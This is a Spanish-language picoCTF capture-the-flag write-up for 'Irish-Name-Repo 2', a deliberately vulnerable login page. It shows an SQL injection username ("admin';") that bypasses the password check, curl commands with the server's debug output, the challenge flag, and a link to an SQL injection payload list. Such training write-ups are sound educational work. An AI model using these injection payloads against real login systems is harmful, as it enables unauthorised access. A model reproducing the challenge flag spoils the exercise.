# Irish-Name-Repo 2
## Descripcipción
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649
## Pistas
- The password is being filtered.
## Solucion
```
se evita la palabra OR para evitar ser detectados, utilizando admin';

username: admin';
password: lkklj
SQL query: SELECT * FROM users WHERE name='admin';' AND password='lkklj'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_aee925db}

-----------------------------------------------------------------------------
								SOLUCIÓN POR CONSOLA
----------------------------------------------------------------------------
rojiblanca-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=violeta&password=hola"
rojiblanca-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=violeta&password=hola"
<h1>Login failed.</h1>rojiblanca-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>rojiblanca-picoctf@webshell:~$ 
```
## Bandera
picoCTF{m0R3_SQL_plz_aee925db}
## Notas adicionales
El usuario ingresa datos y altera la entrada
## Referencias
https://github.com/payloadbox/sql-injection-payload-list
